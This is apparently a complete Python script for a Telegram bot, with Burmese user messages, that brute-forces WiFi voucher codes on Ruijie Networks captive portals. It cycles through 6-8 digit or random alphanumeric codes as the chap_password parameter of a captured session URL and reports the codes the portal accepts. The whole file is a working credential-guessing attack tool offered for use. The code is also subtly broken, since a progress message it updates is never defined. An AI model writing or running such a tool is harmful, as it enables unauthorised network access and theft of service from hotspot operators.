import os
import asyncio
import aiohttp
import json
import random
import re
import time
import uuid
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext

# === CONFIG ===
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "8537971974"))

# === GLOBAL STATE ===
user_data = {}
scanning_active = False
found_codes = []
stop_scan = False

# === COMMAND HANDLERS ===
def start(update: Update, context: CallbackContext):
    update.message.reply_text(
        "🔥 WiFi Voucher Scanner Bot (Render Edition)\n\n"
        "/setup <url> - Session URL ထည့်ရန်\n"
        "/brute <6|7|8|all> - Scan စတင်ရန်\n"
        "/stop - Scan ရပ်ရန်\n"
        "/saved - တွေ့ရှိထားသော codes များကြည့်ရန်\n"
        "/status - Bot အခြေအနေကြည့်ရန်"
    )

def setup(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args
    if not args:
        update.message.reply_text("❌ /setup <session_url> ကို သုံးပါ")
        return
    url = args[0]
    if "ruijienetworks.com" not in url:
        update.message.reply_text("❌ Ruijie portal URL မဟုတ်ပါ")
        return
    user_data[chat_id] = {"session_url": url}
    update.message.reply_text("✅ Session URL သိမ်းဆည်းပြီး")

def brute(update: Update, context: CallbackContext):
    global scanning_active, found_codes, stop_scan
    chat_id = update.effective_chat.id
    if chat_id not in user_data:
        update.message.reply_text("❌ /setup ဖြင့် URL ထည့်ပါ")
        return
    args = context.args
    if not args:
        update.message.reply_text("❌ /brute <6|7|8|all> ကို သုံးပါ")
        return
    mode = args[0]
    if mode not in ["6", "7", "8", "all"]:
        update.message.reply_text("❌ 6, 7, 8, all ကိုသာ သုံးပါ")
        return
    if scanning_active:
        update.message.reply_text("⏳ Scan လုပ်နေပြီးသား")
        return
    scanning_active = True
    stop_scan = False
    found_codes = []
    session_url = user_data[chat_id]["session_url"]
    update.message.reply_text(f"🚀 Scan စတင်ပြီ — Mode: {mode}")
    
    # Scan ကို background thread မှာ run မယ်
    import threading
    thread = threading.Thread(target=run_bruteforce, args=(update, context, mode, session_url))
    thread.start()

def run_bruteforce(update, context, mode, session_url):
    global scanning_active, found_codes, stop_scan
    chat_id = update.effective_chat.id
    
    chars = "0123456789"
    if mode == "all":
        chars = "0123456789abcdefghijklmnopqrstuvwxyz"
    
    total = 10**int(mode) if mode in ["6", "7", "8"] else 1000000
    checked = 0
    start_time = time.time()
    
    for i in range(total):
        if stop_scan or not scanning_active:
            break
        
        if mode in ["6", "7", "8"]:
            code = str(i).zfill(int(mode))
        else:
            code = "".join(random.choice(chars) for _ in range(6))
        
        checked += 1
        
        # Ruijie API ကို request လုပ်ပါ (simplified)
        try:
            import requests
            test_url = f"{session_url}&chap_password={code}"
            response = requests.get(test_url, timeout=5)
            if response.status_code == 200 and "success" in response.text.lower():
                found_codes.append(code)
                context.bot.send_message(
                    chat_id=chat_id,
                    text=f"✅ Found: {code}"
                )
        except:
            pass
        
        if checked % 100 == 0:
            elapsed = time.time() - start_time
            speed = int((checked / elapsed) * 60) if elapsed > 0 else 0
            try:
                context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=(
                        f"🔍 Scanning...\n"
                        f"📦 Checked: {checked:,}\n"
                        f"⚡ Speed: {speed:,} codes/min\n"
                        f"✅ Found: {len(found_codes)}\n"
                        f"📊 Progress: {min(100, (checked/total)*100):.1f}%"
                    )
                )
            except:
                pass
        
        time.sleep(0.01)
    
    scanning_active = False
    context.bot.send_message(
        chat_id=chat_id,
        text=f"🏁 Scan ပြီးဆုံးပြီ — Found: {len(found_codes)} codes"
    )

def stop(update: Update, context: CallbackContext):
    global scanning_active, stop_scan
    scanning_active = False
    stop_scan = True
    update.message.reply_text("⏹️ Scan ရပ်တန့်ပြီး")

def saved(update: Update, context: CallbackContext):
    if not found_codes:
        update.message.reply_text("📭 တွေ့ရှိထားသော code မရှိပါ")
        return
    text = "✅ Found Codes:\n" + "\n".join(found_codes[-20:])
    update.message.reply_text(text)

def status(update: Update, context: CallbackContext):
    uptime = time.time() - start_time
    update.message.reply_text(
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {int(uptime//3600)}h {int((uptime%3600)//60)}m\n"
        f"🔍 Scan Active: {scanning_active}\n"
        f"✅ Found Codes: {len(found_codes)}"
    )

# === MAIN ===
def main():
    updater = Updater(token=BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("setup", setup))
    dp.add_handler(CommandHandler("brute", brute))
    dp.add_handler(CommandHandler("stop", stop))
    dp.add_handler(CommandHandler("saved", saved))
    dp.add_handler(CommandHandler("status", status))
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    start_time = time.time()
    main()
